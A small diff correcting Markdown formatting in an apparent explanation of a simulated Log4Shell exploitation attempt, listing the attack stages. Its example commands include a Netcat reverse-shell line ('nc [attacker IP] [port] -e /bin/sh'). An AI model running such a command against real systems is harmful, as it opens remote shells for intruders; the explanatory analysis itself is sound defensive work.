@@ -196,7 +196,7 @@ Yes- This is a clear simulated **Log4Shell exploitation** attempt:
 3. **Payload Delivery**: The LDAP server responds with a malicious Java class — often a remote loader or exploit code
 4. **Command Execution**: This class contains or triggers Base64-encoded system commands, such as:
      - `touch /tmp/pwned` (test if it works)
-     -` which nc > /tmp/pwned` (check for Netcat)
+     - `which nc > /tmp/pwned` (check for Netcat)
      - `nc [attacker IP] [port] -e /bin/sh` (launch reverse shell)
 
 
